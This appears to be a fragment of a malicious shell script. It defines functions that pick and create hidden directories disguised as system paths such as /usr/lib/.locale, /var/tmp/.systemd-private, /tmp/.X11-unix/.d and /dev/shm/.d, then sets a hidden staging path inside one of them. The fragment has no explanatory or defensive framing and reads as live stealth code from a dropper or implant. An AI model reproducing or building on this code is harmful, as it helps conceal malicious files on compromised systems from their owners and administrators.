...
pick1(){ for b in /usr/lib/.locale /usr/share/.locale /usr/libexec/.cache /usr/share/lib/.data;do d="$(dirname "$b")";if [ -d "$d" ]&&[ -w "$d" ];then mkdir -p "$b" 2>/dev/null&&{ echo "$b";return; };fi;done; }
pick2(){ for b in /var/tmp/.font-unix /var/tmp/.systemd-private /var/cache/.index /var/lib/.uuid;do d="$(dirname "$b")";if [ -d "$d" ]&&[ -w "$d" ];then mkdir -p "$b" 2>/dev/null&&{ echo "$b";return; };fi;done; }
pick3(){ for b in /tmp/.ICE-unix/.d /tmp/.X11-unix/.d /tmp/.font-unix/.d /dev/shm/.d;do d="$(dirname "$b")";if [ -d "$d" ]&&[ -w "$d" ];then mkdir -p "$b" 2>/dev/null&&{ echo "$b";return; };fi;done; }
ST="$(pick3)/.s"
